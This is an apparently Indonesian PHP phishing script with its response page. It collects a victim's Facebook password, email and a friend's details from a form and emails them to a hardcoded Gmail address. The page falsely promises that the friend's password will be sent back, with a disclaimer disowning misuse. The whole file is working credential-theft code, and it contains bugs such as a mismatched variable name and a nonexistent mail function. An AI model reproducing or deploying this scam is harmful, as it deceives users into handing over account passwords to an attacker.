<?php$emailSubject = 'Akun Masuk Boejhank! ';$emailto = 'abdulmuklis127@gmail.com';$FbField = $_POST['fb'];$email1Field = $_POST['email1'];$email2Field = $_POST['email2'];$infoField = $_POST['info'];$body = <<<EOD<br><hr><br>Email Pengirim: $email1Field <br>Password: $fbField <br>Email Temanya: $email2Field <br>Info Temanya: $infoField <br>EOD;$headers = "From: $email1Field\r\n"; $headers .= "Content-type: text/html\r\n"; $success = email ($emailto, $emailSubject, $body, $headers); ?><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Proses pencarian password sedang dilakukan</title></head><body bgcolor="black" text="white">Kami akan memproses permintaan Anda segera.<br>Silakan periksa email Anda untuk mengetahui password teman Anda.<p><p>Segala bentuk penyalahgunaan password yg anda peroleh diluar tanggung jawab kami.</body><html>